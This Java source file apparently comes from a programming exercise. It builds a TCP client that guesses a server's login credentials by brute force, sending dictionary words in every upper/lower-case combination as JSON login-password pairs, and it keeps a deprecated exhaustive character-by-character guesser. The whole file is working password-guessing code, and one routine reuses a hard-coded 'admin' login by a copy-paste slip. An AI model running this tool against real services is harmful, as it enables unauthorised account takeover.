package hacker.main;

import com.google.gson.Gson;
import hacker.json.LoginPasswordPair;
import hacker.json.ServerResponse;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;

import static hacker.data.Config.LOGINS_DIRECTORY;
import static hacker.data.Config.PASSWORDS_DIRECTORY;
import static hacker.main.Main.Responses.SUCCESS;

public class Main {
     enum Responses {
        WRONG_LOGIN("Wrong login!"), WRONG_PASSWORD("Wrong password!"), BAD("Bad request!"), EXCEPTION("Exception happened during login"), SUCCESS("Connection success!");

        private final String message;
            
        Responses(String message) {
            this.message = message;
        }

        private String getMessage() {
            return message;
        }
    }

    public static void main(String[] args) throws IOException {
        String ipAddress = args[0]; int port = Integer.parseInt(args[1]);
        try (Socket socket = new Socket(ipAddress, port);
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
            System.out.println(bruteForcePasswordUsingDictionary("admin", input, output).orElse("Password not found."));
        }
    }

    private static Optional<String> bruteForceLoginUsingDictionary(DataInputStream input, DataOutputStream output) throws IOException {
        try (Reader reader = new FileReader(LOGINS_DIRECTORY)) {
            // Holds the current password being checked from passwords.txt
            StringBuilder commonLoginBuilder = new StringBuilder();
            // Holds each char that is read, used in the while loop
            int i;
            while ((i = reader.read()) != -1) {
                // Current character being read
                char currentCharacter = (char) i;
                // Checking for whitespace/linebreak
                if (Character.toString(currentCharacter).matches("\\s")) {
                    String commonLogin = commonLoginBuilder.toString();
                    // Doesn't need to try case combinations if the password is a number
                    if (commonLogin.matches("[0-9]+")) {
                        output.writeUTF(commonLogin);
                        if (SUCCESS.getMessage().equals(input.readUTF())) {
                            return Optional.of(commonLogin);
                        }
                    } else {
                        BinaryFilter filter = new BinaryFilter(commonLogin.length());
                        String[] allCaseCombinations = filter.modifyStringAllCombinations(commonLogin, Character::toUpperCase);
                        Optional<String> possibleCorrectLogin = tryArrayOfPasswords("admin", allCaseCombinations, input, output);
                        if (possibleCorrectLogin.isPresent()) {
                            return possibleCorrectLogin;
                        }
                    }
                    commonLoginBuilder = new StringBuilder();
                } else {
                    commonLoginBuilder.append(currentCharacter);
                }
            }
        }
        return Optional.empty();
    }

    /**
     * Brute forces the password using the provided dictionary of passwords in passwords.txt. Also tries all possible combinations of cases of each password.
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return either an empty Optional or an Optional containing the correct password
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> bruteForcePasswordUsingDictionary(String login, DataInputStream input, DataOutputStream output) throws IOException {
        try (Reader reader = new FileReader(PASSWORDS_DIRECTORY)) {
            // Holds the current password being checked from passwords.txt
            StringBuilder commonPasswordBuilder = new StringBuilder();
            // Holds each char that is read, used in the while loop
            int i;
            while ((i = reader.read()) != -1) {
                // Current character being read
                char currentCharacter = (char) i;
                // Checking for whitespace/linebreak
                if (Character.toString(currentCharacter).matches("\\s")) {
                    String commonPassword = commonPasswordBuilder.toString();
                    // Doesn't need to try case combinations if the password is a number
                    if (commonPassword.matches("[0-9]+")) {
                        output.writeUTF(commonPassword);
                        if (SUCCESS.getMessage().equals(input.readUTF())) {
                            return Optional.of(commonPassword);
                        }
                    } else {
                        BinaryFilter filter = new BinaryFilter(commonPassword.length());
                        String[] allCaseCombinations = filter.modifyStringAllCombinations(commonPassword, Character::toUpperCase);
                        Optional<String> possibleCorrectPassword = tryArrayOfPasswords(login, allCaseCombinations, input, output);
                        if (possibleCorrectPassword.isPresent()) {
                            return possibleCorrectPassword;
                        }
                    }
                    commonPasswordBuilder = new StringBuilder();
                    // REMOVE THIS LATER
                } else {
                    commonPasswordBuilder.append(currentCharacter);
                }
            }
        }
        return Optional.empty();
    }

    /**
     * Takes a login password pair object and sends it to the sever.
     * @param pair the pair object to be sent
     * @param input the input stream to which to respond if the pair was correct or not
     * @param output the output stream to which to send the attempted pair
     * @return the response from the server
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static ServerResponse tryLoginPasswordPair(LoginPasswordPair pair, DataInputStream input, DataOutputStream output) throws IOException {
        Gson gson = new Gson();
        String json = gson.toJson(pair, LoginPasswordPair.class);
        output.writeUTF(json);
        return gson.fromJson(input.readUTF(), ServerResponse.class);
    }

    /**
     * Takes a string array of passwords and sends each password to the provided output stream, testing if it is correct.
     * @param passwords the string array of passwords to be tested
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return either an empty Optional or an Optional containing the correct password
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> tryArrayOfPasswords(String login, String[] passwords, DataInputStream input, DataOutputStream output) throws IOException {
        for (String password : passwords) {
            Gson gson = new Gson();
            String json = gson.toJson(new LoginPasswordPair(login, password), LoginPasswordPair.class);
            output.writeUTF(json);
            if (SUCCESS.getMessage().equals(input.readUTF())) {
                return Optional.of(password);
            }
        }
        return Optional.empty();
    }

    /**
     * Tries to brute force all possible passwords.
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return the correct password once it is found
     * @throws IOException if something goes wrong with the input/output of data
     */
    @Deprecated
    private static String bruteForce(DataInputStream input, DataOutputStream output) throws IOException {
        List<Character> passwordAttempt = new ArrayList<>();
        passwordAttempt.add('`');
        infiniteloop:
        while (true) {
            // Check if any part of the password needs to cycle back to "a"
            if (passwordAttempt.get(passwordAttempt.size() - 1) == '9') {
                // Iterating backwards until it finds the character which is not equal to 9 and sets it to the next character
                for (int i = passwordAttempt.size() - 1; i >= 0; i--) {
                    if (passwordAttempt.get(i) != '9') {
                        passwordAttempt.set(i, nextCharacter(passwordAttempt.get(i)));
                        // Sets all the characters after the found one to "a"
                        for (int j = passwordAttempt.size() - 1; j > i; j--) {
                            passwordAttempt.set(j, 'a');
                        }
                        continue infiniteloop;
                    }
                }
                // If the loop finds none of them to be not equal to 9, then the password attempt needs to be extended
                passwordAttempt.add('a');
                passwordAttempt = passwordAttempt.stream().map(x -> 'a').collect(Collectors.toList());
            } else {
                passwordAttempt.set(passwordAttempt.size() - 1, nextCharacter(passwordAttempt.get(passwordAttempt.size() - 1)));
            }
            String sentPassword = joinList(passwordAttempt);
            output.writeUTF(sentPassword);
            if (SUCCESS.getMessage().equals(input.readUTF())) {
                return sentPassword;
            }
        }
    }

    /**
     * Returns the next character to be checked in the next iteration of the cycle when brute forcing all combinations.
     * @param previousCharacter the previous character which is being changed
     * @return the next character to be checked
     */
    @Deprecated
    private static char nextCharacter(char previousCharacter) {
        if (previousCharacter == 'z') {
            return '0';
        }
        return (char) (previousCharacter + 1);
    }

    /**
     * Takes a char list and returns a string containing the contents of the list in the same order.
     * @param array the char list to be joined
     * @return the joined list
     */
    @Deprecated
    private static <T> String joinList(List<T> array) {
        StringBuilder sentPassword = new StringBuilder();
        array.forEach(x -> sentPassword.append(x.toString()));
        return sentPassword.toString();
    }
}